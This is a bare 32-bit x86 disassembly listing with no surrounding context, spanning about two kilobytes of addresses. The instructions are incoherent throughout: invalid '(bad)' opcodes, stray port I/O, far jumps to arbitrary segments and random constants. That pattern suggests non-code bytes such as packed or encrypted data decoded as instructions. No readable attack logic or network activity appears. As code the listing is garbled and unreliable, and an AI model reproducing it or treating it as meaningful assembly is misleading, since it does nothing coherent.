  412468:	das    
  412469:	mov    ah,0x9b
  41246b:	mov    ah,0x79
  41246d:	int3   
  41246e:	aas    
  41246f:	cmp    al,0x44
  412471:	xchg   ecx,eax
  412472:	adc    eax,0x8fc40966
  412477:	sbb    al,0xce
  412479:	inc    ebx
  41247a:	jne    0x41240e
  41247c:	dec    BYTE PTR [ebx]
  41247e:	pop    ss
  41247f:	in     eax,dx
  412480:	outs   dx,BYTE PTR ds:[esi]
  412481:	mov    ah,BYTE PTR [edx+0x2ddf3dc5]
  412487:	lea    ebp,[eax-0x58]
  41248a:	stos   BYTE PTR es:[edi],al
  41248b:	xor    cl,BYTE PTR [eax]
  41248d:	dec    edx
  41248e:	jp     0x412437
  412490:	mov    ebx,0x427d5646
  412495:	add    al,0xbd
  412497:	and    eax,0xd01a3272
  41249c:	mov    bl,0xb8
  41249e:	in     al,0x9e
  4124a0:	sub    BYTE PTR [eax+edx*2+0x50],bh
  4124a4:	fstp   DWORD PTR [ebp-0x60]
  4124a7:	(bad)  
  4124a8:	(bad)  [ecx-0x460cbc84]
  4124ae:	jmp    0xb822:0x66cdd2e7
  4124b5:	out    dx,al
  4124b6:	mov    edx,ecx
  4124b8:	fistp  WORD PTR [esi+0x77]
  4124bb:	and    DWORD PTR [edi+ebx*2],0x33fdde7f
  4124c2:	mov    esp,DWORD PTR [edx]
  4124c4:	sub    al,0xe1
  4124c6:	ins    BYTE PTR es:[edi],dx
  4124c7:	fs pop ebp
  4124c9:	pop    ecx
  4124ca:	es adc al,0xae
  4124cd:	jbe    0x41249f
  4124cf:	retf   
  4124d0:	ja     0x412496
  4124d2:	retf   
  4124d3:	adc    DWORD PTR [ecx-0x1f928b7a],esp
  4124d9:	push   esi
  4124da:	push   cs
  4124db:	xchg   esi,eax
  4124dc:	xchg   edi,eax
  4124dd:	mov    BYTE PTR [ebp-0x56594bdc],cl
  4124e3:	push   esp
  4124e4:	inc    edi
  4124e5:	ret    0xb4d4
  4124e8:	nop
  4124e9:	push   cs
  4124ea:	retf   0x3dfe
  4124ed:	into   
  4124ee:	into   
  4124ef:	push   edx
  4124f0:	ins    BYTE PTR es:[edi],dx
  4124f1:	sub    dh,ah
  4124f3:	(bad)  
  4124f4:	cs cmp eax,0xd15238b5
  4124fa:	mov    ch,0x8b
  4124fc:	in     al,0x55
  4124fe:	pop    ss
  4124ff:	xor    ebp,DWORD PTR [esi-0x1807f9ae]
  412505:	ror    BYTE PTR [eax+0xb],0x6e
  412509:	push   ebx
  41250a:	retf   
  41250b:	mov    ebx,DWORD PTR [edx+0x59a3dd4e]
  412511:	in     al,0x50
  412513:	icebp  
  412514:	or     al,dh
  412516:	(bad)  [ebx+0x4]
  412519:	fcomp  DWORD PTR [edi-0x56]
  41251c:	std    
  41251d:	add    DWORD PTR [edi+0x3b],edi
  412520:	mov    al,ds:0x4473411
  412525:	fcomp  DWORD PTR [eax]
  412527:	into   
  412528:	es push eax
  41252a:	add    edx,DWORD PTR [edx-0x46]
  41252d:	mov    dh,0x9c
  41252f:	pop    es
  412530:	fstp   DWORD PTR [ebx+edx*2-0x21]
  412534:	inc    edx
  412535:	cdq    
  412536:	repnz dec DWORD PTR [edi]
  412539:	mov    dh,0x59
  41253b:	dec    edi
  41253c:	lea    edi,[ecx+0xb]
  41253f:	fbstp  TBYTE PTR [ebx-0x8]
  412542:	push   ecx
  412543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412544:	fadd   st(7),st
  412546:	dec    ecx
  412547:	mov    dh,0xc8
  412549:	or     eax,DWORD PTR [edi]
  41254b:	ds jbe 0x412566
  41254e:	or     DWORD PTR [ecx],0xffffffa1
  412551:	pop    eax
  412552:	repnz mov ?,ebx
  412555:	fnstsw WORD PTR ds:0x399e01c3
  41255b:	mov    ch,BYTE PTR [ebx+0x34f5c609]
  412561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412562:	sar    DWORD PTR [ebp+0x7871d912],0x4
  412569:	push   ss
  41256a:	iret   
  41256b:	mov    ah,BYTE PTR [edi-0x7a430b62]
  412571:	clc    
  412572:	dec    esp
  412573:	xchg   DWORD PTR [ebp-0x7cb93216],eax
  412579:	dec    ebp
  41257a:	enter  0x63b8,0xaf
  41257e:	retf   
  41257f:	repz xor bl,bh
  412582:	or     al,0x9e
  412584:	dec    BYTE PTR [esi+eiz*4-0x5cc504f8]
  41258b:	push   0xf8b5328a
  412590:	and    al,0x2
  412592:	or     eax,0xcc4009d0
  412597:	xor    bl,dl
  412599:	jecxz  0x4125a1
  41259b:	and    DWORD PTR [ecx+0x2adc608c],0xffffff95
  4125a2:	sbb    cl,BYTE PTR [esi-0x4d0cf4a1]
  4125a8:	push   ds
  4125a9:	cmp    DWORD PTR [ebx+edi*2-0xc],esi
  4125ad:	mov    esi,0x2333e798
  4125b2:	mov    eax,0x713e86c2
  4125b7:	push   esi
  4125b8:	inc    edx
  4125b9:	xchg   esi,eax
  4125ba:	fcomi  st,st(1)
  4125bc:	adc    eax,0x487a8f16
  4125c1:	cmp    DWORD PTR [ebp+0x0],ebp
  4125c4:	push   edx
  4125c5:	mov    ds:0x71d17248,ax
  4125cb:	or     edx,0x3a79a6c1
  4125d1:	pop    esi
  4125d2:	test   BYTE PTR [ebx-0x20c37548],cl
  4125d8:	sti    
  4125d9:	fsub   DWORD PTR [edi-0x59e9b26c]
  4125df:	pusha  
  4125e0:	mov    ebp,0xaa4d595b
  4125e5:	pop    esi
  4125e6:	jecxz  0x412607
  4125e8:	fidiv  WORD PTR [ebx]
  4125ea:	add    BYTE PTR [eax+0x6d17d72],ch
  4125f0:	repnz shl BYTE PTR [ecx],0x9c
  4125f4:	mov    ebx,0x8ed0c85d
  4125f9:	stc    
  4125fa:	das    
  4125fb:	inc    edx
  4125fc:	(bad)  
  4125fd:	cmp    al,0xeb
  4125ff:	and    ebx,DWORD PTR [edx]
  412601:	xchg   esi,eax
  412602:	xor    eax,0x1d7a344e
  412607:	mov    ah,0x6a
  412609:	or     BYTE PTR [esi+0x67],dh
  41260c:	in     eax,dx
  41260d:	mov    ch,0xd8
  41260f:	(bad)  
  412611:	mov    esp,fs
  412613:	mov    WORD PTR [ebp+ebp*8-0x13],ds
  412617:	lds    ebp,FWORD PTR ds:0xf7ab5d48
  41261d:	and    al,0x74
  41261f:	xor    al,0x68
  412621:	jmp    0x43c:0xb4a4ba59
  412628:	xor    eax,0x22769b67
  41262d:	jmp    0x4125da
  41262f:	mov    dh,BYTE PTR [edi+0x29]
  412632:	add    al,0x39
  412634:	mov    ds:0x45418e6b,eax
  412639:	mov    eax,ds:0x874f827b
  41263e:	or     eax,0xb659341d
  412643:	test   eax,0x78a52f6d
  412648:	jno    0x41265c
  41264a:	xchg   ebx,eax
  41264b:	clc    
  41264c:	xchg   BYTE PTR [edi-0x17],dh
  41264f:	test   eax,0x84269403
  412654:	push   esp
  412655:	jno    0x4125fb
  412657:	add    al,0xe5
  412659:	dec    ecx
  41265a:	es mov dh,0x1
  41265d:	pop    esi
  41265e:	jo     0x4126ac
  412660:	mov    DWORD PTR [ecx],ebp
  412662:	test   al,0x8e
  412664:	das    
  412665:	xchg   edi,eax
  412666:	inc    eax
  412667:	ror    BYTE PTR [ecx],0xc4
  41266a:	inc    edx
  41266b:	pop    esi
  41266c:	inc    DWORD PTR [ecx]
  41266e:	stos   DWORD PTR es:[edi],eax
  41266f:	mov    dh,0x41
  412671:	imul   eax,DWORD PTR [eax-0x47b9f16b],0xc07faf2c
  41267b:	mov    cl,0x93
  41267d:	gs dec edx
  41267f:	jne    0x412668
  412681:	mov    ecx,0xebcf74a5
  412686:	lds    ecx,FWORD PTR [ecx-0x5967b3ff]
  41268c:	jge    0x412622
  41268e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41268f:	rcr    BYTE PTR [ebx+0x3e],1
  412692:	cwde   
  412693:	test   ah,ch
  412695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412696:	sar    eax,1
  412698:	out    0x34,eax
  41269a:	pusha  
  41269b:	ror    BYTE PTR [eax+0x2c8d6661],cl
  4126a1:	(bad)  
  4126a2:	outs   dx,DWORD PTR ds:[esi]
  4126a3:	sbb    al,0xec
  4126a5:	jnp    0x4126a9
  4126a7:	pop    esi
  4126a8:	dec    ebx
  4126a9:	clc    
  4126aa:	pop    esp
  4126ab:	sub    eax,0x50fed96e
  4126b0:	push   esp
  4126b1:	pusha  
  4126b2:	scas   al,BYTE PTR es:[edi]
  4126b3:	cmc    
  4126b4:	lods   eax,DWORD PTR ds:[esi]
  4126b5:	aam    0xdf
  4126b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126b8:	fchs   
  4126ba:	test   al,0x5a
  4126bc:	cmp    eax,0x98a9885c
  4126c1:	in     eax,dx
  4126c2:	jecxz  0x41267b
  4126c4:	sar    bh,cl
  4126c6:	and    ch,BYTE PTR [edi+0x68e821fc]
  4126cc:	sub    dh,BYTE PTR [ecx-0x304977f4]
  4126d2:	jge    0x412692
  4126d4:	shr    ch,1
  4126d6:	or     bh,al
  4126d8:	shl    DWORD PTR [edx-0x1b7661ac],0x98
  4126df:	cwde   
  4126e0:	jle    0x4126e9
  4126e2:	mov    dh,0x26
  4126e4:	int3   
  4126e5:	cmp    BYTE PTR ds:0x401c3b94,cl
  4126eb:	xchg   edx,eax
  4126ec:	jge    0x412748
  4126ee:	arpl   WORD PTR [ecx-0x4a454e18],si
  4126f4:	neg    ebp
  4126f6:	inc    eax
  4126f7:	xor    eax,0x221a879a
  4126fc:	(bad)  
  4126fd:	das    
  4126fe:	hlt    
  4126ff:	mov    DWORD PTR [edx-0x26],esi
  412702:	mov    dh,0xa8
  412704:	fdiv   st(1),st
  412706:	leave  
  412707:	mov    ecx,0x29abd440
  41270c:	daa    
  41270d:	(bad)  
  41270f:	xchg   DWORD PTR [edx],ebp
  412711:	inc    edi
  412712:	mov    ebp,0x66227c88
  412717:	cmp    edi,ebp
  412719:	cli    
  41271a:	push   esp
  41271b:	cmp    eax,0xc554b30a
  412720:	cmp    al,0x8
  412722:	push   ds
  412723:	inc    ecx
  412724:	jb     0x41274e
  412726:	hlt    
  412727:	cli    
  412728:	mov    eax,ds:0x99533ca7
  41272d:	sub    cl,BYTE PTR [edx-0x10]
  412730:	mov    bl,0x25
  412732:	push   esp
  412733:	ja     0x41271c
  412735:	loop   0x4127a1
  412737:	jo     0x4126f2
  412739:	adc    dl,BYTE PTR [eax]
  41273b:	pop    ebx
  41273c:	int    0xc4
  41273e:	sar    DWORD PTR [edi-0x41],cl
  412741:	sub    ah,cl
  412743:	adc    ebp,DWORD PTR [ebx+0x20]
  412746:	ret    
  412747:	push   edi
  412748:	xor    eax,0x132f44f8
  41274d:	push   esp
  41274e:	dec    edi
  41274f:	fcom   QWORD PTR [ebp-0x47]
  412752:	mov    bh,0x5e
  412754:	push   ss
  412755:	xor    bl,0x74
  412758:	rcr    BYTE PTR [esi-0x335a1d8c],1
  41275e:	sub    DWORD PTR [esi-0x5a460bbb],edx
  412764:	lock or eax,0x5aa971ef
  41276a:	rep ins DWORD PTR es:[edi],dx
  41276c:	jl     0x4127bf
  41276e:	pop    ss
  41276f:	fisub  WORD PTR [ecx-0x71510419]
  412775:	sti    
  412776:	mov    eax,0xeec43aed
  41277b:	jmp    0x418acc75
  412780:	(bad)
  412783:	out    0xb6,eax
  412785:	jns    0x4127af
  412787:	pop    esp
  412788:	mov    ecx,0x63263d86
  41278d:	(bad)  
  41278e:	je     0x41275d
  412790:	nop
  412791:	dec    ecx
  412792:	xchg   esp,eax
  412793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412794:	sbb    DWORD PTR [ecx-0x36],0x69bbbd2d
  41279b:	push   0x7e
  41279d:	xchg   esp,eax
  41279e:	bound  eax,QWORD PTR [eax]
  4127a0:	bound  ebp,QWORD PTR [eax-0x6]
  4127a3:	push   0xffffffc0
  4127a5:	mov    esi,DWORD PTR [ecx+edx*4]
  4127a8:	aas    
  4127a9:	or     DWORD PTR [ebx],edi
  4127ab:	iret   
  4127ac:	imul   ebp,DWORD PTR [edi+0x30bafde3],0xffffffdd
  4127b3:	or     ebx,DWORD PTR [ebp-0x48]
  4127b6:	mov    ecx,0x8b50b95d
  4127bb:	ror    DWORD PTR [ecx],cl
  4127bd:	cmp    BYTE PTR [eax+esi*8],ch
  4127c0:	sbb    dl,ah
  4127c2:	test   al,0x8e
  4127c4:	dec    esp
  4127c5:	cmp    BYTE PTR [edi-0x3c],cl
  4127c8:	sub    al,0xe4
  4127ca:	in     al,0x97
  4127cc:	sub    esp,ebp
  4127ce:	pop    esi
  4127cf:	stos   BYTE PTR es:[edi],al
  4127d0:	sbb    ebx,DWORD PTR [ebp-0x783b9860]
  4127d6:	add    al,0xc5
  4127d8:	and    BYTE PTR [ebp+0xd],0x72
  4127dc:	mov    ebp,0xe1194f0b
  4127e1:	xchg   ebp,eax
  4127e2:	ins    BYTE PTR es:[edi],dx
  4127e3:	mov    esi,0xa3cd3290
  4127e8:	or     al,0x4e
  4127ea:	sub    eax,0xdab66a13
  4127ef:	mov    bl,0x87
  4127f1:	dec    ebp
  4127f2:	scas   eax,DWORD PTR es:[edi]
  4127f3:	mov    ebp,0x84e21dde
  4127f8:	xchg   DWORD PTR [ebp-0x2],ebx
  4127fb:	shr    ebx,1
  4127fd:	imul   edx,DWORD PTR [ebx-0x54],0x40c93a95
  412804:	push   ebx
  412805:	xchg   ecx,eax
  412806:	sub    eax,0xd9edf5be
  41280b:	add    DWORD PTR [edx],esi
  41280d:	aam    0x2b
  41280f:	int3   
  412810:	in     eax,0x17
  412812:	retf   0xae15
  412815:	(bad)  
  412816:	mov    esi,0xe1f89fe1
  41281b:	and    BYTE PTR gs:[ecx],dh
  41281e:	mov    ecx,0x66f8f92e
  412823:	test   eax,0x383ab621
  412828:	mov    BYTE PTR [eax+0x4f69baf],0xb7
  41282f:	xchg   eax,ebx
  412831:	mov    bh,0xa5
  412833:	(bad)  
  412835:	adc    DWORD PTR [esi-0x4],ebx
  412838:	iret   
  412839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41283a:	test   DWORD PTR [bx+0x57f],ecx
  41283f:	bound  ebp,QWORD PTR [esi+0x26]
  412842:	pop    ebp
  412843:	mov    bh,0x29
  412845:	adc    BYTE PTR [edi-0x6ee3463a],dh
  41284b:	xor    bl,BYTE PTR [ebx]
  41284d:	push   ds
  41284e:	loopne 0x4128c4
  412850:	outs   dx,BYTE PTR ds:[esi]
  412851:	ror    bh,0x34
  412854:	adc    ah,al
  412856:	and    bh,dl
  412858:	adc    BYTE PTR [edx+eax*4-0x254e8478],0xa
  412860:	push   ebp
  412861:	and    eax,0x6da33d5e
  412866:	std    
  412867:	repz in al,0xf3
  41286a:	std    
  41286b:	mov    eax,ds:0xedca827b
  412870:	add    ah,BYTE PTR [esi+ecx*4-0x42]
  412874:	sbb    eax,0x47da24bc
  412879:	call   0xca0f:0x8136b768
  412880:	push   cs
  412881:	and    al,0x86
  412883:	dec    edi
  412884:	int3   
  412885:	mov    dh,0x32
  412887:	leave  
  412888:	aaa    
  412889:	jbe    0x412859
  41288b:	fist   WORD PTR [edi-0x68e2e80f]
  412891:	pop    ebx
  412892:	lahf   
  412893:	dec    edi
  412894:	or     eax,0xe88da933
  412899:	mov    edi,0x1e2807df
  41289e:	jne    0x4128e2
  4128a0:	mov    bl,ch
  4128a2:	repnz mov ah,0xc0
  4128a5:	popa   
  4128a6:	inc    esi
  4128a7:	out    dx,al
  4128a8:	jge    0x4128f0
  4128aa:	cmp    ecx,edi
  4128ac:	mov    esi,0xdd5e3b55
  4128b1:	pop    esp
  4128b2:	repnz int 0xb4
  4128b5:	cli    
  4128b6:	mov    ebx,0xc8f8a122
  4128bb:	imul   esi,DWORD PTR [eax+edi*4],0x9700366c
  4128c2:	fs test al,0x2b
  4128c5:	fidiv  DWORD PTR [ecx-0xd]
  4128c8:	sahf   
  4128c9:	fnsave [ebp-0x68]
  4128cc:	adc    bh,ah
  4128ce:	test   ebp,esp
  4128d0:	outs   dx,DWORD PTR ds:[esi]
  4128d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128d2:	repnz dec edx
  4128d4:	mov    bl,0xc4
  4128d6:	ret    0x9cd5
  4128d9:	(bad)  
  4128da:	mov    es:0xd6f503f1,al
  4128e0:	mov    cl,0x52
  4128e2:	fdivr  QWORD PTR [edi]
  4128e4:	jecxz  0x4128d7
  4128e6:	and    ebx,eax
  4128e8:	inc    edi
  4128e9:	enter  0x93d5,0x18
  4128ed:	push   ds
  4128ee:	neg    DWORD PTR [ebp-0x5d970978]
  4128f4:	in     al,dx
  4128f5:	jnp    0x41287c
  4128f7:	jle    0x4128af
  4128f9:	in     eax,0x4a
  4128fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128fc:	jmp    FWORD PTR [eax]
  4128fe:	arpl   WORD PTR [ebx],bp
  412900:	pop    esi
  412901:	es aas 
  412903:	adc    ah,BYTE PTR [edx+0x43]
  412906:	mov    ds:0xe3f3f523,al
  41290b:	popa   
  41290c:	ins    DWORD PTR es:[edi],dx
  41290d:	lahf   
  41290e:	xor    DWORD PTR [edx+0x4b],esi
  412911:	push   0x71
  412913:	repz in al,0x6e
  412916:	add    esi,DWORD PTR [edi]
  412918:	stos   DWORD PTR es:[edi],eax
  412919:	fstp   QWORD PTR [esi-0xbb9c3af]
  41291f:	fstp   TBYTE PTR [edx-0x73]
  412922:	pop    esi
  412923:	in     al,0x14
  412925:	lods   eax,DWORD PTR ds:[esi]
  412926:	(bad)  
  412927:	sahf   
  412928:	and    dl,ch
  41292a:	mov    edx,0xc5225b0a
  41292f:	pusha  
  412930:	idiv   ecx
  412932:	ss push cs
  412934:	sub    ecx,DWORD PTR [ecx-0x1]
  412937:	call   0xf8710cb2
  41293c:	adc    DWORD PTR [edi+esi*4-0x11],0x4a0e102f
  412944:	jnp    0x412992
  412946:	stos   DWORD PTR es:[edi],eax
  412947:	push   cs
  412948:	cmp    bh,BYTE PTR [ebx+0x51]
  41294b:	mov    eax,ds:0xae3000f5
  412950:	dec    ecx
  412951:	les    ebp,FWORD PTR [edi+0xf]
  412954:	mov    edi,0x83eb0de7
  412959:	pop    es
  41295a:	jmp    0x9c44:0x9b1df524
  412961:	xlat   BYTE PTR ds:[ebx]
  412962:	cmp    eax,0xcc7eda89
  412967:	in     eax,dx
  412968:	aam    0x7b
  41296a:	sub    eax,0xbe8336d6
  41296f:	imul   ecx,DWORD PTR [edi-0xe],0xffffffe5
  412973:	adc    DWORD PTR [edi],edi
  412975:	and    al,0x95
  412977:	fistp  DWORD PTR ss:[eax-0x1ec7d96f]
  41297e:	test   cl,bl
  412980:	and    bl,al
  412982:	jnp    0x41293e
  412984:	fld    TBYTE PTR [edi+0x2245034b]
  41298a:	mov    al,0x24
  41298c:	and    bl,BYTE PTR [edi]
  41298e:	jb     0x412975
  412990:	loopne 0x412968
  412992:	stos   DWORD PTR es:[edi],eax
  412993:	in     al,0x26
  412995:	push   ebp
  412996:	imul   sp,WORD PTR [eax+0x7a],0x26
  41299b:	add    DWORD PTR [edx-0x4d],esi
  41299e:	ins    BYTE PTR es:[edi],dx
  41299f:	rcr    DWORD PTR [esp+edi*8+0x7c],cl
  4129a3:	dec    ebx
  4129a4:	iret   
  4129a5:	imul   DWORD PTR [eax+0x53]
  4129a8:	imul   eax,DWORD PTR [ebx-0x6c],0x6d5850db
  4129af:	cmp    esi,DWORD PTR [ecx]
  4129b1:	inc    ecx
  4129b2:	test   DWORD PTR [ebx],ecx
  4129b4:	add    al,0x86
  4129b6:	or     al,0x64
  4129b8:	rcl    DWORD PTR [edi+0x178dae6e],1
  4129be:	(bad)  
  4129bf:	xchg   edi,eax
  4129c0:	xlat   BYTE PTR ds:[ebx]
  4129c1:	lahf   
  4129c2:	(bad)  
  4129c3:	sti    
  4129c4:	cmp    al,0xf4
  4129c6:	(bad)  
  4129c8:	push   esp
  4129c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ca:	jmp    0xdc8d:0x6771c1d9
  4129d1:	mov    fs,WORD PTR [eax]
  4129d3:	xor    ch,bl
  4129d5:	int    0xae
  4129d7:	jb     0x412964
  4129d9:	outs   dx,BYTE PTR ds:[esi]
  4129da:	fucom  st(2)
  4129dc:	xchg   esi,eax
  4129dd:	xor    DWORD PTR [ecx+0x5a],0xffffffa1
  4129e1:	and    eax,0x6a01fb98
  4129e6:	cmp    eax,0x25d631e9
  4129eb:	out    dx,al
  4129ec:	jae    0x412a3d
  4129ee:	mov    dh,0xba
  4129f0:	cmp    edi,DWORD PTR [esi-0x372449ce]
  4129f6:	sbb    edx,ecx
  4129f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129f9:	int    0x76
  4129fb:	pusha  
  4129fc:	push   es
  4129fd:	mov    ch,0xe1
  4129ff:	inc    esi
  412a00:	loope  0x412991
  412a02:	and    bl,0x9b
  412a05:	mov    dl,0xff
  412a07:	gs jg  0x4129bd
  412a0a:	lahf   
  412a0b:	loop   0x4129e1
  412a0d:	fldcw  WORD PTR [eax+0x1e]
  412a10:	add    al,bh
  412a12:	mov    BYTE PTR [ecx],cl
  412a14:	sub    al,0xa3
  412a16:	cmp    ecx,DWORD PTR [esi+ebp*4+0x719de076]
  412a1d:	fwait
  412a1e:	dec    eax
  412a1f:	rcr    BYTE PTR [esi+edi*2-0x6ccb2e7a],cl
  412a26:	stos   DWORD PTR es:[edi],eax
  412a27:	fwait
  412a28:	mov    ch,0x2c
  412a2a:	add    DWORD PTR ds:0xfa0ff1c0,0x400b3538
  412a34:	add    ch,BYTE PTR [esi+0x4a]
  412a37:	out    dx,al
  412a38:	cmc    
  412a39:	and    BYTE PTR [ebp+0x10f254f5],bl
  412a3f:	push   ss
  412a40:	xchg   BYTE PTR [edi+0x1b],al
  412a43:	rol    BYTE PTR [ebx*1+0x5a60a718],1
  412a4a:	mov    ecx,DWORD PTR [esp+ecx*8+0x4b1a6d01]
  412a51:	dec    edi
  412a52:	add    al,bh
  412a54:	or     al,0xc1
  412a56:	add    eax,0xc139b94f
  412a5b:	aam    0x35
  412a5d:	outs   dx,BYTE PTR ds:[esi]
  412a5e:	mov    edi,0x89a8b940
  412a63:	dec    ebx
  412a64:	adc    DWORD PTR [ebx+0x24],ebx
  412a67:	mov    eax,ds:0x6c1c5596
  412a6c:	lods   eax,DWORD PTR ds:[esi]
  412a6d:	mov    ebx,0xd2d75242
  412a72:	dec    edi
  412a73:	sbb    ecx,DWORD PTR [eax-0x6841009c]
  412a79:	xchg   edx,eax
  412a7a:	jmp    0x412a65
  412a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a7d:	mov    esi,?
  412a7f:	fild   QWORD PTR [ebp+0x74]
  412a82:	xor    eax,DWORD PTR [eax+0x54a35e65]
  412a88:	les    edi,FWORD PTR [esi-0x3e]
  412a8b:	div    al
  412a8d:	call   0x8fe1:0xa2f9d44b
  412a94:	xchg   ebx,eax
  412a95:	enter  0xdd76,0xe1
  412a99:	dec    edi
  412a9a:	call   0xfb99:0xdef95e8b
  412aa1:	pusha  
  412aa2:	mov    bl,0x50
  412aa4:	int3   
  412aa5:	aaa    
  412aa6:	jo     0x412a5f
  412aa8:	scas   eax,DWORD PTR es:[edi]
  412aa9:	ds daa 
  412aab:	sbb    ah,bl
  412aad:	xchg   ecx,eax
  412aae:	sub    DWORD PTR [edx-0x66],edx
  412ab1:	xchg   ebp,eax
  412ab2:	test   al,0xcf
  412ab4:	rcr    DWORD PTR [ecx+0x41123957],1
  412aba:	imul   edx,ecx,0x10
  412abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412abe:	sub    DWORD PTR fs:[esi-0x7b],edi
  412ac2:	test   eax,0x68a7e6af
  412ac7:	cmp    BYTE PTR [ecx+0x7],ch
  412aca:	adc    eax,0x18d1611f
  412acf:	sti    
  412ad0:	dec    ebx
  412ad1:	test   al,0x93
  412ad3:	mov    edi,0x8b942b3d
  412ad8:	lds    ebp,FWORD PTR [ebx-0x7e665626]
  412ade:	clc    
  412adf:	or     al,0x10
  412ae1:	cmp    eax,0x6ad4045d
  412ae6:	and    al,0x56
  412ae8:	or     al,0x3e
  412aea:	clc    
  412aeb:	aaa    
  412aec:	sbb    BYTE PTR [edi+0x52a0aafb],cl
  412af2:	or     ebp,esp
  412af4:	dec    ebx
  412af5:	(bad)  
  412af6:	frstor [edi]
  412af8:	mov    BYTE PTR [esi-0x428a4bca],ah
  412afe:	ins    BYTE PTR es:[edi],dx
  412aff:	jg     0x412b3d
  412b01:	mov    ebp,0x9740703e
  412b06:	mov    ebp,0xaf434e1
  412b0b:	adc    edi,DWORD PTR [esi-0x9]
  412b0e:	in     al,dx
  412b0f:	and    eax,0x3aeded79
  412b14:	inc    edx
  412b15:	es jle 0x412b22
  412b18:	ins    DWORD PTR es:[edi],dx
  412b19:	push   eax
  412b1a:	sub    bl,BYTE PTR [edx+0x16dc3f9a]
  412b20:	dec    ebp
  412b21:	pop    esi
  412b22:	push   es
  412b23:	push   esi
  412b24:	and    dl,BYTE PTR [ecx+0x4511c851]
  412b2a:	out    dx,eax
  412b2b:	imul   esp,DWORD PTR [edx-0x1d284ade],0x3d
  412b32:	fld    QWORD PTR [esi+0x4a]
  412b35:	mov    gs,WORD PTR [edx+0x1bdb083b]
  412b3b:	cmp    eax,0x9724b617
  412b40:	inc    ebp
  412b41:	(bad)  
  412b43:	popa   
  412b44:	jle    0x412bc4
  412b46:	js     0x412bb5
  412b48:	jp     0x412b5f
  412b4a:	stos   DWORD PTR es:[edi],eax
  412b4b:	test   eax,0x8d808f4b
  412b50:	rcr    BYTE PTR [ebx-0x3261486f],1
  412b56:	mov    bl,0xd1
  412b58:	fdiv   QWORD PTR ds:0xe6191964
  412b5e:	fisttp DWORD PTR [edi+edi*8]
  412b61:	popf   
  412b62:	repnz int 0x13
  412b65:	adc    eax,0xd36d87b1
  412b6a:	loope  0x412bbe
  412b6c:	enter  0x1658,0xe
  412b70:	and    ebp,DWORD PTR [ecx-0x6e1e5505]
  412b76:	xchg   al,cl
  412b78:	imul   eax,DWORD PTR [ebx-0x54],0xffffffde
  412b7c:	(bad)  
  412b7d:	mov    eax,ds:0xbaafdcb3
  412b82:	add    DWORD PTR [ebx-0xe],0xffffff92
  412b86:	inc    esi
  412b87:	jno    0x412bef
  412b89:	ins    BYTE PTR es:[edi],dx
  412b8a:	fnstenv [esi+edi*8+0x1c]
  412b8e:	dec    ebp
  412b8f:	mov    esp,0x45d40591
  412b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b95:	fistp  WORD PTR [esi+0x6872bf74]
  412b9b:	mov    edi,0xf59f9a75
  412ba0:	fbld   TBYTE PTR [esi+eiz*2-0x42]
  412ba4:	mov    cl,0x4c
  412ba6:	mov    ebp,0x89efdc50
  412bab:	outs   dx,BYTE PTR ds:[esi]
  412bac:	inc    eax
  412bad:	cmp    cl,dh
  412baf:	push   0x8349522c
  412bb4:	mov    eax,DWORD PTR [edi+0x41]
  412bb7:	mov    esi,0xd0272db4
  412bbc:	test   esp,edx
  412bbe:	pop    ds
  412bbf:	ds loopne 0x412bc0
  412bc2:	xchg   esi,eax
  412bc3:	sbb    eax,0x2488d2d6
  412bc8:	scas   eax,DWORD PTR es:[edi]
  412bc9:	clc    
  412bca:	outs   dx,BYTE PTR ds:[esi]
  412bcb:	retf   
  412bcc:	mov    DWORD PTR [esi+0x71],eax
  412bcf:	arpl   WORD PTR [ebx+0x14],cx
  412bd2:	dec    ecx
  412bd3:	push   esp
  412bd4:	pop    ds
  412bd5:	popa   
  412bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bd7:	hlt    
  412bd8:	dec    eax
  412bd9:	ss cwde 
  412bdb:	push   0xffffffec
  412bdd:	dec    edi
  412bde:	mov    esi,esp
  412be0:	shr    DWORD PTR ss:[edi+eiz*1],cl
  412be4:	pop    esi
  412be5:	dec    edx
  412be6:	adc    esp,DWORD PTR [edx]
  412be8:	test   al,0x4a
  412bea:	ret    0x29ab
  412bed:	mov    eax,0x87bb553c
  412bf2:	fistp  WORD PTR [edx]
  412bf4:	(bad)  [edi-0x4e]
  412bf7:	mov    eax,0x23b99fd5
  412bfc:	adc    bh,BYTE PTR [edx+0xf8d64a]
  412c02:	sar    edx,1
  412c04:	fiadd  DWORD PTR [esi+0x249274fc]
  412c0a:	fstp   DWORD PTR [ecx]
  412c0c:	icebp  
  412c0d:	repnz sbb ch,ah
  412c10:	and    eax,0xd1e2649c
  412c15:	retf   
  412c16:	into   
  412c17:	retf   
  412c18:	cmpxchg DWORD PTR [ebp-0x75],edi
  412c1c:	xchg   edi,eax
  412c1d:	sbb    eax,0xcc88f10c
  412c22:	or     al,0x4f
  412c24:	and    esp,DWORD PTR [ebx-0x48]
  412c27:	les    edx,FWORD PTR [ebp+0x150327cd]
  412c2d:	mov    esp,0x51192d1f
  412c32:	jae    0x412c99
  412c34:	add    ch,BYTE PTR [ecx-0x5b]
  412c37:	jbe    0x412c79
  412c39:	arpl   WORD PTR [ebx+0x46d2c2fb],bx
  412c3f:	stos   DWORD PTR es:[edi],eax
  412c40:	lahf   
  412c41:	test   DWORD PTR [edi+0x6f],ecx
  412c44:	add    DWORD PTR [edi-0x3b],edx
  412c47:	je     0x412c79
  412c49:	in     eax,0xee
  412c4b:	test   al,0x19
  412c4d:	sub    BYTE PTR [edi+edx*2+0x75],al
  412c51:	sub    al,0xa2
  412c53:	in     eax,dx
  412c54:	into   
  412c55:	mov    eax,0x1d61291b
